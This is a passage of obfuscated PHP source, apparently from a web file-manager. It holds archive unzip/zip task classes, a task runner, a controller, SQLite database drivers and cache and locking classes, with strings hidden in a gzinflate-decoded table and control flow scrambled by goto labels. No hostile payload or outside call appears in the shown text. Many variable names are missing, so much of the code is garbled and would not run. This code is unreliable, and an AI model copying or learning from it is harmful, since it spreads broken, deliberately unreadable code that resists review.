$[$][$溠[1396]]; } } } if (!is_array($) || count($) == 0) { return !1; } $ = $[count($) - 1]; if (!IO::exist($ݢ)) { return !1; } $ = TEMP_FILES . $溠[1400] . kodIO::hashPathSafe($ݢ) . $溠[8]; $ևۏ = $ . $[$溠[1396]]; mk_dir($); file_put_contents(TEMP_FILES . $溠[1374], $溠[12]); if (IO::exist($ևۏ)) { return array($溠[230] => $ևۏ, $溠[1382] => $, $溠[1383] => $); } $ʽ = self::localFilePath($ݢ); if (!$ʽ) { $ʽ = $ . $溠[1401]; if (!IO::exist($ʽ)) { self::copy($ݢ, $, !1, get_path_this($ʽ)); } } if (!$ʽ || !IO::exist($ʽ)) { return !1; } if ($[$溠[1309]] == -1) { return array($溠[230] => $ʽ, $溠[1382] => $, $溠[1383] => $); } $ˇ = $ʽ; foreach ($ as $ => $쇋) { if (!$쇋 || $쇋[$溠[1309]] == $溠[1381]) { break; } if (substr($쇋[$溠[32]], -1, 1) == $溠[8]) { break; } $ = in_array(get_path_ext($쇋[$溠[1396]]), array($溠[388], $溠[1387], $溠[1388], $溠[1389], $溠[1390], $溠[1391])); $Κ = $ == count($) - 1 && $; $ɇ = $ . $쇋[$溠[1396]]; $羶 = $ . get_path_this($쇋[$溠[32]]); if (IO::exist($ɇ)) { $ˇ = $ɇ; continue; } $ж = $ == 0 ? get_path_ext($ޭ) : get_path_ext($ˇ); $ = KodArchive::extract(self::iconvSystem($ˇ), $, $쇋[$溠[1309]], $ӄں, $ж); self::unzipErrorCheck($, array($溠[1402], $ݢ, $, $쇋, $ɇ)); if (IO::exist($羶)) { IO::rename($羶, get_path_this($ɇ)); } $ˇ = $ɇ; } $ևۏ = $ˇ; return array($溠[230] => $ˇ, $溠[1382] => $, $溠[1383] => $); } private static function unzipErrorCheck($Ӱ, $݊ = false) { $؅ =& $_SERVER[ܮ]; if ($Ӱ[$؅[1403]]) { return !0; } write_log(array($؅[1404], $Ӱ, $݊), $؅[1405]); $ = is_array($Ӱ[$؅[1393]]) ? json_encode($Ӱ[$؅[1393]]) : $Ӱ[$؅[1393]]; show_json($؅[1406] . $, !1); die; } } goto ãΠ; E: define($_SERVER[ܮ][0], $_SERVER[ܮ][1]); $_SERVER[] = explode($_SERVER[ܮ][2], gzinflate(substr($_SERVER[ܮ][3], 10, -8))); function binCheckEq($ʭ, $) { return $ʭ == $; } goto eЙ; fЦ籖: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ج, $ߡ = 5.0) { if (!$ج) { return; } $ǉ = Cache::get($ج); if (!$ǉ || timeFloat() - floatVal($ǉ) >= $ߡ) { Cache::set($ج, timeFloat(), $ߡ * 10); return !0; } return !1; } public static function timeLimitCall($ͧǀ, $ª, $Ĕ, $ = 5.0) { $܌ =& $_SERVER[ܮ]; if (!$ͧǀ || !$ª) { return; } self::$asyncAdd = !0; $؏· = $܌[2092]; $ = Cache::get($؏·, !0); $ = array($܌[2093] => timeFloat(), $܌[2094] => timeFloat(), $܌[342] => $ª, $܌[2084] => $Ĕ, $܌[2095] => $); if (is_array($[$ͧǀ])) { if (timeFloat() - $[$ͧǀ][$܌[2093]] <= $[$܌[2095]] * 0.5) { return; } $[$܌[2094]] = $[$ͧǀ][$܌[2094]]; } $[$ͧǀ] = $; Cache::set($؏·, $, 60); Cache::removeMemory($؏·); write_log($܌[2096] . $ͧǀ . $܌[74] . $ª . $܌[2097] . ACTION, $܌[195]); } public static function timeLimitCallLoop() { $Ƹ =& $_SERVER[ܮ]; $ = array($Ƹ[2098]); $¦ = in_array(strtolower(ACTION), $); if (!$¦ && !self::$asyncAdd) { return; } $Ê = $Ƹ[2092]; $ = Cache::get($Ê, !0); if (!$ || count($) <= 0) { return; } $倲 = timeFloat(); $ۃ = array(); $ = array(); foreach ($ as $њ => $ƫ) { if ($倲 - $ƫ[$Ƹ[2094]] > $ƫ[$Ƹ[2095]]) { $[$њ] = $ƫ; continue; } $ۃ[$њ] = $ƫ; } if (count($) == 0) { return; } if (count($ۃ) == 0) { Cache::remove($Ê); } else { Cache::set($Ê, $ۃ, 60); } Cache::removeMemory($Ê); self::runArr($); } public static function finished($Ҁ, $ܰҾ) { $ʘ =& $_SERVER[ܮ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ʘ[342] => $Ҁ, $ʘ[2084] => $ܰҾ); } private static function runArr($Ꜻ) { $愀ܴ =& $_SERVER[ܮ]; if (!$Ꜻ) { return; } foreach ($Ꜻ as $֯ => $š) { try { Hook::apply($š[$愀ܴ[342]], $š[$愀ܴ[2084]]); write_log($愀ܴ[2099] . $֯ . $愀ܴ[74] . $š[$愀ܴ[342]] . $愀ܴ[2097] . ACTION, $愀ܴ[195]); } catch (Exception $ҳ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ =& $_SERVER[ܮ]; parent::startAfter(); Hook::bind($[2100], array($this, $[2101])); Hook::bind($[1385], array($this, $[2102])); Hook::bind($[2103], array($this, $[2104])); $懓 =& $this->task; $懓[$[2105]] = $[1386]; if (!$懓[$[1866]]) { $懓[$[1866]] = LNG($[2106]); } } protected function endAfter() { $Ȍ =& $_SERVER[ܮ]; parent::endAfter(); Hook::unbind($Ȍ[2100], array($this, $Ȍ[2101])); Hook::unbind($Ȍ[1385], array($this, $Ȍ[2102])); Hook::unbind($Ȍ[2103], array($this, $Ȍ[2104])); } public function updateAfter() { $ =& $_SERVER[ܮ]; $ =& $this->task; if (!$[$[1232]] || !$[$[862]]) { if ($[$[2105]] != $[388]) { return; } } if ($[$[2105]] == $[1386]) { $ = 0; if ($[$[2030]]) { $ = $[$[2031]] / $[$[2030]]; } $[$[1978]] = $ * 0.3; } else { if ($[$[2105]] == $[388]) { $ = $[$[1977]] / $[$[1232]]; $[$[1978]] = 0.3 + $ * 0.4; } else { if ($[$[2105]] == $[107]) { $َ = 0; if ($[$[2032]] == $[107]) { $َ = $[$[2031]]; } $ = ($[$[947]] + $َ) / $[$[862]]; $[$[1978]] = 0.3 + 0.4 + $ * 0.3; } } } if ($[$[1978]] > 0) { $ی = timeFloat() - $[$[1980]] - $[$[1983]]; $[$[1984]] = $ی * (1 - $[$[1978]]) / $[$[1978]]; } } public function addFile($浽) { $옭 =& $_SERVER[ܮ]; $ =& $this->task; $ޕ = IO::info($浽); $[$옭[2028]] = $ޕ[$옭[32]]; $[$옭[2030]] = $ޕ[$옭[79]]; $[$옭[2031]] = 0; $[$옭[1234]] = $옭[2058]; $[$옭[2032]] = $옭[1386]; $[$옭[862]] = $ޕ[$옭[79]]; $[$옭[1232]] = 1; $̖ = 0; $[$옭[2040]] = array($옭[2041] => $̖ + 1, $옭[509] => $ޕ[$옭[32]], $옭[87] => $ޕ[$옭[87]], $옭[602] => $ޕ[$옭[602]] ? $ޕ[$옭[602]] : $ޕ[$옭[87]]); $this->update(); } public function zipEvent($҄, $ۏ, $ʒ, $) { $՛ =& $_SERVER[ܮ]; $ݓ =& $this->task; $ݓ[$՛[2028]] = get_path_this($ۏ); $ݓ[$՛[2030]] = $; $ݓ[$՛[2031]] = $ʒ; $ݓ[$՛[1234]] = $҄ == $՛[2107] ? $՛[2108] : $՛[2109]; $ݓ[$՛[2032]] = $՛[12]; $ݓ[$՛[862]] = $; $ݓ[$՛[2105]] = $՛[388]; $this->update(); } public function unzipAfter($) { $Ά =& $_SERVER[ܮ]; $ୖ =& $this->task; $ୖ[$Ά[2105]] = $Ά[107]; $ = IO::infoWithChildren($); $ = 0; $ୖ[$Ά[2040]] = array($Ά[2041] => $ + 1, $Ά[509] => $[$Ά[32]], $Ά[87] => $[$Ά[87]], $Ά[602] => $[$Ά[602]] ? $[$Ά[602]] : $[$Ά[87]]); if ($[$Ά[33]] == $Ά[230]) { $ୖ[$Ά[1232]] = 1; } else { $ୖ[$Ά[1232]] = $[$Ά[82]][$Ά[80]]; } $ୖ[$Ά[1234]] = $Ά[12]; $ୖ[$Ά[2032]] = 0; $ୖ[$Ά[1977]] = 0; $ୖ[$Ά[2030]] = 0; $ୖ[$Ά[2031]] = 0; $ୖ[$Ά[2028]] = $Ά[12]; $ୖ[$Ά[947]] = 0; $ୖ[$Ά[862]] = $[$Ά[79]]; $this->update(); self::log($Ά[2110] . json_encode(array($ୖ, $))); } public function nameParse($ޱ) { $㍱ =& $_SERVER[ܮ]; $ =& $this->task; if ($[$㍱[2105]] == $㍱[1386]) { $[$㍱[2105]] = $㍱[388]; $[$㍱[947]] = 0; $[$㍱[862]] = 0; } $㏣ = get_path_this($ޱ); if (strstr($㏣, $㍱[10])) { $[$㍱[1977]] += 1; $[$㍱[1232]] += 1; } $[$㍱[2028]] = $ޱ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ġ =& $_SERVER[ܮ]; parent::startAfter(); Hook::bind($ġ[2111], array($this, $ġ[2101])); Hook::bind($ġ[2103], array($this, $ġ[2104])); $Ἴ =& $this->task; $Ἴ[$ġ[2105]] = $ġ[1386]; if (!$Ἴ[$ġ[1866]]) { $Ἴ[$ġ[1866]] = LNG($ġ[2112]); } } protected function endAfter() { $ =& $_SERVER[ܮ]; parent::endAfter(); Hook::unbind($[2111], array($this, $[2101])); Hook::unbind($[2103], array($this, $[2104])); } public function updateAfter() { $䧜 =& $_SERVER[ܮ]; $١ =& $this->task; if (!$١[$䧜[1232]] || !$١[$䧜[862]]) { return; } if ($١[$䧜[2105]] == $䧜[1386]) { $郧 = $١[$䧜[2031]]; if ($١[$䧜[2032]] != $䧜[1386]) { $郧 = 0; } $ = ($١[$䧜[947]] + $郧) / $١[$䧜[862]]; $١[$䧜[1978]] = $ * 0.3; } else { if ($١[$䧜[2105]] == $䧜[388]) { $ = $١[$䧜[1977]] / $١[$䧜[1232]]; $١[$䧜[1978]] = 0.3 + $ * 0.5; } else { if ($١[$䧜[2105]] == $䧜[107]) { $ = 0; if ($١[$䧜[2030]]) { $ = $١[$䧜[2031]] / $١[$䧜[2030]]; } $١[$䧜[1978]] = 0.3 + 0.5 + $ * 0.2; } } } if ($١[$䧜[1978]] > 0) { $ = timeFloat() - $١[$䧜[1980]] - $١[$䧜[1983]]; $١[$䧜[1984]] = $ * (1 - $١[$䧜[1978]]) / $١[$䧜[1978]]; } } public function copyFileStart($, $, $, $, $磧, $ʚ) { $ٕ =& $_SERVER[ܮ]; parent::copyFileStart($, $, $, $, $磧, $ʚ); $⚟ =& $this->task; if ($⚟[$ٕ[2105]] == $ٕ[388]) { $⚟[$ٕ[2105]] = $ٕ[107]; } $this->update(); } public function copyFileEnd($߫, $Ί͒, $Ģ, $҉, $ɶ, $露) { $ =& $_SERVER[ܮ]; $ߑ =& $this->task; $ߑ[$[2031]] = $ߑ[$[2030]]; $ߑ[$[947]] += $ߑ[$[2030]]; $ߑ[$[2032]] = $[12]; $this->update(); } public function zipEvent($υ, $Ӓƽ, $, $) { $ =& $_SERVER[ܮ]; $ݫ =& $this->task; $ݫ[$[2028]] = get_path_this($Ӓƽ); $ݫ[$[2030]] = $; $ݫ[$[2031]] = $; $ݫ[$[1234]] = $υ == $[2113] ? $[2108] : $[2109]; $ݫ[$[2032]] = $[12]; $ݫ[$[862]] = $; $ݫ[$[2105]] = $[388]; $this->update(); } public function nameParse($˼Ւ) { $ =& $_SERVER[ܮ]; $ =& $this->task; if ($[$[1977]] < $[$[1232]]) { $ȷ = get_path_this($˼Ւ); if (strstr($ȷ, $[10])) { $[$[1977]] += 1; } } if ($[$[2105]] == $[1386]) { $[$[2105]] = $[388]; } $[$[2028]] = $˼Ւ; $this->update(); } } goto f︭; Dֿ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ѹ =& $_SERVER[ܮ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ѹ[6]] =& $config; $this->values[$Ѹ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ѹ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($) { if (1 === func_num_args()) { $this->{$} = new $(); } else { $Պ = new ReflectionClass($); $늅 = func_get_args(); array_shift($늅); $this->{$} = $Պ->newInstanceArgs($늅); } return $this->{$}; } public function routeBind($ݾװ, $, $ = 3) { $ =& $_SERVER[ܮ]; $Πư = $this->in[$[9]]; $ݾװ = str_replace($[10], $[11], trim(trim($ݾװ, $[8]), $[12])); if (!$ݾװ || count($Πư) <= $) { return !1; } $ = !0; $⡬ = explode($[8], $ݾװ); for ($ء = 0; $ء < count($⡬); $ء++) { if ($⡬[$ء] != $Πư[$ + $ء]) { $ = !1; break; } } if (!$) { return; } call_user_func_array(array($this, $), array()); } public function routeArgs($ď = 3) { $ؘ = $this->in[$_SERVER[ܮ][9]]; if (count($ؘ) <= $ď) { return array(); } $҄ = array(); for ($۵ = $ď; $۵ < count($ؘ); $۵ += 2) { $҄[$ؘ[$۵]] = $ؘ[$۵ + 1]; $this->in[$ؘ[$۵]] = $ؘ[$۵ + 1]; } return $҄; } protected function assign($, $剷) { $this->values[$] = $剷; } protected function display($Ç) { ob_end_clean(); extract($this->values); require $this->tpl . $Ç; } } class DbSqliteBase extends Db { public function __construct($ҩ = '') { $ =& $_SERVER[ܮ]; if (!extension_loaded($[13])) { think_exception(think_lang($[14]) . $[15]); } if (!empty($ҩ)) { if (!isset($ҩ[$[16]])) { $ҩ[$[16]] = 438; } $this->config = $ҩ; if (empty($this->config[$[17]])) { $this->config[$[17]] = array(); } } } public function connect($ׂܙ = '', $욻 = 0) { $ٕ =& $_SERVER[ܮ]; if (!isset($this->linkID[$욻])) { if (empty($ׂܙ)) { $ׂܙ = $this->config; } $󼖪 = !empty($ׂܙ[$ٕ[17]][$ٕ[18]]) ? $ׂܙ[$ٕ[17]][$ٕ[18]] : $this->pconnect; $Ԑ× = $󼖪 ? $ٕ[19] : $ٕ[20]; $this->linkID[$욻] = $Ԑ×($ׂܙ[$ٕ[21]], $ׂܙ[$ٕ[16]]); if (!$this->linkID[$욻]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$욻], 30000); if (1 != think_config($ٕ[22])) { unset($this->config); } } return $this->linkID[$욻]; } public function free() { $this->queryID = null; } public function query($) { $َ޵ =& $_SERVER[ܮ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($َ޵[23], 1); think_status($َ޵[24]); $this->queryID = sqlite_query($this->_linkID, $); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ȷ = $this->getAll(); return $ȷ; } } public function execute($ŉƭ) { $ݥ =& $_SERVER[ܮ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŉƭ; if ($this->queryID) { $this->free(); } think_action_status($ݥ[25], 1); think_status($ݥ[24]); $ = sqlite_exec($this->_linkID, $ŉƭ); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ܮ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ͮ = sqlite_query($this->_linkID, $_SERVER[ܮ][27]); if (!$ͮ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $︚ = sqlite_query($this->_linkID, $_SERVER[ܮ][28]); if (!$︚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ = array(); if ($this->numRows > 0) { for ($⡽ = 0; $⡽ < $this->numRows; $⡽++) { $[$⡽] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $; } public function getFields($) { $ԖŦ =& $_SERVER[ܮ]; $孱 = $this->query($ԖŦ[29] . $ . $ԖŦ[30]); $ = array(); if ($孱) { foreach ($孱 as $ => $㒧) { $[$㒧[$ԖŦ[31]]] = array($ԖŦ[32] => $㒧[$ԖŦ[31]], $ԖŦ[33] => $㒧[$ԖŦ[34]], $ԖŦ[35] => (bool) ($㒧[$ԖŦ[36]] === $ԖŦ[12]), $ԖŦ[37] => $㒧[$ԖŦ[38]], $ԖŦ[39] => strtolower($㒧[$ԖŦ[40]]) == $ԖŦ[41], $ԖŦ[42] => strtolower($㒧[$ԖŦ[43]]) == $ԖŦ[44]); } } return $; } public function getTables($خ = '') { $ﵬ =& $_SERVER[ܮ]; $ʗŲ = $this->query($ﵬ[45] . $ﵬ[46] . $ﵬ[47]); $ߛ = array(); foreach ($ʗŲ as $ => $ǉ) { $ߛ[$] = current($ǉ); } return $ߛ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ =& $_SERVER[ܮ]; $ᢆ = sqlite_last_error($this->_linkID); $this->error = $ᢆ . $[4] . sqlite_error_string($ᢆ); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($񄵗) { return sqlite_escape_string($񄵗); } public function parseLimit($) { $ =& $_SERVER[ܮ]; $ = $[12]; if (!empty($)) { $ = explode($[50], $); if (count($) > 1) { $ .= $[51] . $[1] . $[52] . $[0] . $[53]; } else { $ .= $[51] . $[0] . $[53]; } } return $; } } class DbSqlite3Base extends Db { public function __construct($ձ = '') { $߱ =& $_SERVER[ܮ]; if (!class_exists($߱[54])) { think_exception(think_lang($߱[14]) . $߱[55]); } if (!empty($ձ)) { if (!isset($ձ[$߱[16]])) { $ձ[$߱[16]] = 438; } $this->config = $ձ; if (empty($this->config[$߱[17]])) { $this->config[$߱[17]] = array(); } } } public function connect($݂ = '', $»Ǔ = 0) { $ߡ =& $_SERVER[ܮ]; if (!isset($this->linkID[$»Ǔ])) { if (empty($݂)) { $݂ = $this->config; } $this->linkID[$»Ǔ] = new SQLite3($݂[$ߡ[21]]); if (!$this->linkID[$»Ǔ]) { think_exception($this->linkID[$»Ǔ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$»Ǔ]->busyTimeout(30000); if (1 != think_config($ߡ[22])) { unset($this->config); } } return $this->linkID[$»Ǔ]; } public function free() { $this->queryID = null; } public function query($) { $̝ =& $_SERVER[ܮ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($̝[23], 1); think_status($̝[24]); $this->queryID = $this->_linkID->query($); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $κ = $this->getAll(); $this->numRows = count($κ); return $κ; } } public function execute($߈) { $Ġ =& $_SERVER[ܮ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $߈; if ($this->queryID) { $this->free(); } think_action_status($Ġ[25], 1); think_status($Ġ[24]); $͂ = $this->_linkID->exec($߈); $this->debug(); if (!1 === $͂) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ܮ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = $this->_linkID->query($_SERVER[ܮ][27]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->query($_SERVER[ܮ][28]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ǭя = array(); while ($ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ǭя[] = $; } $this->queryID->reset(); return $ǭя; } public function getFields($Ό) { $ =& $_SERVER[ܮ]; $樐 = $this->query($[29] . $Ό . $[30]); $л = array(); if ($樐) { foreach ($樐 as $ => $) { $л[$[$[32]]] = array($[32] => $[$[32]], $[33] => $[$[33]], $[35] => (bool) ($[$[35]] === $[12]), $[37] => $[$[56]], $[39] => (bool) $[$[57]], $[42] => (bool) $[$[57]]); } } return $л; } public function getTables($ŭ = '') { $ѹ =& $_SERVER[ܮ]; $ = $this->query($ѹ[45] . $ѹ[46] . $ѹ[47]); $ = array(); foreach ($ as $ => $) { $[$] = current($); } return $; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ =& $_SERVER[ܮ]; $this->error = $this->_linkID->lastErrorMsg(); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($ต) { $ =& $_SERVER[ܮ]; if ($this->_linkID) { return $this->_linkID->escapeString($ต); } return str_ireplace($[58], $[59], $ต); } public function parseLimit($¡) { $۷ =& $_SERVER[ܮ]; $т = $۷[12]; if (!empty($¡)) { $¡ = explode($۷[50], $¡); if (count($¡) > 1) { $т .= $۷[51] . $¡[1] . $۷[52] . $¡[0] . $۷[53]; } else { $т .= $۷[51] . $¡[0] . $۷[53]; } } return $т; } } goto E; fͪÅ: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $߄ =& $_SERVER[ܮ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $é = $GLOBALS[$߄[6]][$߄[424]]; $𭡢 = $é[$é[$߄[986]]]; $ܓ = $é[$߄[987]]; switch ($é[$߄[986]]) { case $߄[21]: self::$handle = Model($߄[988]); break; case $߄[989]: self::$handle = new CacheRedis($𭡢, $ܓ); break; case $߄[990]: self::$handle = new CacheMemcached($𭡢, $ܓ); break; case $߄[230]: self::$handle = new CacheFile($𭡢, $ܓ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($) { if (is_array($) || is_object($)) { $ = json_encode($); } $ = rawurlencode($); return md5(KOD_SITE_ID . $_SERVER[ܮ][11] . $); } public static function get($Ñ, $ = false) { $Ȝ = self::key($Ñ); $蘸 = self::init(); if ($) { return unserialize($蘸->get($Ȝ)); } if (!isset(self::$memoryCache[$Ȝ])) { $׳ = $蘸->get($Ȝ); self::$memoryCache[$Ȝ] = unserialize($׳); } return self::$memoryCache[$Ȝ]; } public static function set($⻌, $, $; = false) { $烐 =& $_SERVER[ܮ]; $ꌫ = self::key($⻌); if (isset(self::$memoryCache[$ꌫ]) && self::$memoryCache[$ꌫ] === $) { return !0; } if ($; === 0) { self::$memoryCache[$ꌫ] = $; return !0; } $ = self::init(); $ݐ = serialize($); CacheLock::lock($⻌ . $烐[991]); $ = $->set($ꌫ, $ݐ, $;); self::$memoryCache[$ꌫ] = $; CacheLock::unlock($⻌ . $烐[991]); return $; } public static function getCall($ד, $߱, $ͭ, $͔ = array()) { $ّ =& $_SERVER[ܮ]; $ = self::get($ד); if ($ || $ === $ّ[12]) { return $; } $ = call_user_func_array($ͭ, $͔); $ = $ ? $ : $ّ[12]; self::set($ד, $, $߱); return $; } public static function limitCall($, $ܼ = 15, $ɬ = 30, $ڋ = true) { $ͧ =& $_SERVER[ܮ]; static $ = array(); if ($ڋ) { $ = $ . $ͧ[992] . KodUser::id() . $ͧ[993] . get_client_ip(); } if (isset($[$]) && is_array($[$])) { return $[$][$ͧ[332]] <= $ɬ; } $ = self::get($); if (!is_array($) || time() - $[$ͧ[204]] > $ܼ) { $ = array($ͧ[204] => time(), $ͧ[332] => 0); } $[$ͧ[332]]++; self::set($, $, $ܼ); $[$] = $; return $[$ͧ[332]] <= $ɬ; } public static function limitRuntime($͇׹, $©) { $ = $_SERVER[ܮ][994] . $͇׹; if (isset(self::$runTimeCache[$]) || !$©) { return !0; } $ = intval(self::get($)); $ = !$ || $ <= 0 ? 1 : $ + 1; if ($ > $©) { return !1; } self::$runTimeCache[$] = !0; self::set($, $, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ => $Д) { $̾ = intval(self::get($)); $̾ = !$̾ || $̾ <= 1 ? 0 : $̾ - 1; self::set($, $̾, 3600); } self::$runTimeCache = array(); } public static function remove($) { $Ħ = self::key($); unset(self::$memoryCache[$Ħ]); self::clearTimeout(); CacheLock::lock($); $ = self::init()->remove($Ħ); CacheLock::unlock($); return $; } public static function removeMemory($) { $ = self::key($); unset(self::$memoryCache[$]); } public static function clearMemory($ = false) { if ($) { $ = self::key($); unset(self::$memoryCache[$]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ܮ][995])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ܮ][996])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($, $Ĳ) { $ڙ =& $_SERVER[ܮ]; $this->cachePath = $[$ڙ[87]]; $this->prefix = $ڙ[997]; $this->cacheTime = $Ĳ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($̈́) { $ʍ =& $_SERVER[ܮ]; $̈́ = str_replace(array($ʍ[998], $ʍ[97], $ʍ[76]), $ʍ[999], $̈́); return $this->cachePath . $ʍ[1000] . $̈́ . $ʍ[1001]; } public function set($, $, $ʪ = false) { $ʪ = $ʪ ? $ʪ : $this->cacheTime; $̫á = $this->getFile($); if (file_put_contents($̫á, $this->prefix . $, LOCK_EX)) { @touch($̫á, intval(time() + $ʪ)); clearstatcache(); return !0; } @unlink($̫á); return !1; } public function get($) { $ = $this->getFile($); if (file_exists($) && filemtime($) < time()) { @unlink($); return !1; } $Ȓ = @file_get_contents($); return substr($Ȓ, strlen($this->prefix)); } public function remove($Ø) { $ = $this->getFile($Ø); return @unlink($); } public function deleteAll() { $ =& $_SERVER[ܮ]; $ = scandir($this->cachePath); foreach ($ as $) { $ = $this->cachePath . $; if (strpos($, $[1001]) && strpos($, $[1002])) { @unlink($); } } } public function clearTimeout() { $׮ =& $_SERVER[ܮ]; $􋿴 = scandir($this->cachePath); foreach ($􋿴 as $) { $⬓ = $this->cachePath . $; if (strpos($⬓, $׮[1001]) && strpos($⬓, $׮[1002]) && filemtime($⬓) < time()) { @unlink($⬓); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ƞ =& $_SERVER[ܮ]; if (self::$handle) { return self::$handle; } $ż = $GLOBALS[$Ƞ[6]][$Ƞ[424]]; self::$timeout = $ż[$Ƞ[1003]] ? $ż[$Ƞ[1003]] : 10; $Ǜ = _get($GLOBALS[$Ƞ[6]], $Ƞ[1004]); $ = $ż[$Ƞ[986]] ? $ż[$Ƞ[986]] : $Ƞ[230]; if ($ == $Ƞ[21] && $Ǜ == $Ƞ[13]) { $ = $Ƞ[230]; } switch ($) { case $Ƞ[989]: self::$handle = new CacheLockRedis(); break; case $Ƞ[990]: self::$handle = new CacheLockMemcached(); break; case $Ƞ[21]: self::$handle = new CacheLockDatabase(); break; case $Ƞ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ƞ[1005], $Ƞ[1006]); } return self::$handle; } private static function key($øۥ) { return $_SERVER[ܮ][1007] . Cache::key($øۥ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ = '') { self::$errorMsg = $; } public static function lockGlobal($, $) { return self::lock($, $, !0); } public static function lock($߈, $ = false, $ߟנ = false) { $ =& $_SERVER[ܮ]; $ = self::init(); $ޕȂ = self::key($߈); $ = $ ? $ : self::$timeout; $ = timeFloat(); if (_get($GLOBALS, $[1008], !1)) { if (!$->lock($ޕȂ, 0.2)) { die; } return !0; } $ = $->lock($ޕȂ, $); $裴ś = timeFloat(); if (!$) { $ = "\154\x6f\x63\153\x20\x65\162\x72\x6f\x72\x3b\x6b\x65\x79\75{$߈}\73\x74\x69\155\x65\75{$}\73" . self::$errorMsg . $[74] . get_caller_msg(); $ū = LNG($[1009]) . "\x28{$}\x73\x29\x2e" . LNG($[1010]); $ū .= $[1011]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ū = $ū . $[1012] . self::$errorMsg; } write_log($[1013] . sprintf($[1014], timeFloat() - $) . $[1015] . $ . $[1016] . json_encode(error_get_last()), $[1006]); show_json($ū, !1); } if (!$ߟנ) { self::$lockItem[$ޕȂ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ = number_format(timeFloat() - $裴ś, 3); write_log($[1017] . $߈ . $[1018] . $, $[1006]); } return $; } public static function lockGet($ۍ) { $ = self::key($ۍ); if (self::$lockItem[$]) { return self::$lockItem[$]; } return self::init()->lockGet($); } public static function unlock($) { $Ϭ =& $_SERVER[ܮ]; $̅ΐ = self::key($); self::$lockItem[$̅ΐ] = null; self::init()->unlock($̅ΐ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ϭ[1019] . $, $Ϭ[1006]); } return; } public static function unlockRuntime() { $蹥 =& $_SERVER[ܮ]; $ = self::init(); $ = !1; foreach (self::$lockItem as $ => $ի) { if (!$ի) { continue; } $->unlock($); if (!$) { $ = !0; write_log($蹥[1020] . $ . $蹥[74] . get_caller_msg(), $蹥[1006]); continue; } write_log($蹥[1020] . $, $蹥[1006]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($蹥[1021] . $ . $蹥[1022] . ACTION, $蹥[1006]); } } public static function fileLock($ꉎŅ) { $ =& $_SERVER[ܮ]; if (!$GLOBALS[$[1023]]) { 